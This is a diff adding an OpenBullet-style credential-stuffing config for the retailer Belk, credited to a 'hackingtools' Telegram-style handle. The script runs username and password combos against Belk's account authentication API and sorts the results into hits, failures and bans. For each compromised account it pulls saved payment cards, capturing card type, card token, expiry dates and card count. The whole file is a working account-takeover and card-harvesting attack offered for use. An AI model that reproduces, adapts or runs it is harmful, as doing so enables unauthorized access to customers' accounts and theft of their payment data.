@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Belk(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-30T23:57:35.8412215+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "token" 
+
+REQUEST POST "https://appcdn.belk.com/ocapi-account/belk/customers/auth?ocapi_channel=mcom21" 
+  CONTENT "{\"type\":\"credentials\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "authorization: Basic <token>" 
+  HEADER "content-type: application/json" 
+  HEADER "user-agent: okhttp/4.9.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Customer authentication based on Authorization:Basic header failed." 
+  KEYCHAIN Success OR 
+    KEY "customer_id" 
+  KEYCHAIN Ban OR 
+    KEY "Two concurrent requests tried to write to" 
+
+PARSE "<HEADERS(Authorization)>" LR "" "" -> VAR "auth" 
+
+PARSE "<SOURCE>" JSON "customer_id" -> VAR "cid" 
+
+REQUEST GET "https://appcdn.belk.com/ocapi-account/belk/customers/<cid>/payment_instruments?ocapi_channel=mcom21" 
+  
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "user-agent: Belk/913 CFNetwork/1240.0.4 Darwin/20.6.0" 
+  HEADER "x-firebase-appcheck: " 
+  HEADER "x-firebase-appcheck-enforced: false" 
+  HEADER "customerid: <cid>" 
+  HEADER "accept-language: en-us" 
+  HEADER "authorization: <auth>" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" JSON "card_type" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "credit_card_token" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Number" 
+
+PARSE "<SOURCE>" JSON "expiration_month" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Month" 
+
+PARSE "<SOURCE>" JSON "expiration_year" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Year" 
+
+PARSE "<SOURCE>" JSON "credit_card_expired" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Expired" 
+
+PARSE "<SOURCE>" JSON "total" CreateEmpty=FALSE -> CAP "Total Cards" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Total Cards>" EqualTo "0" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
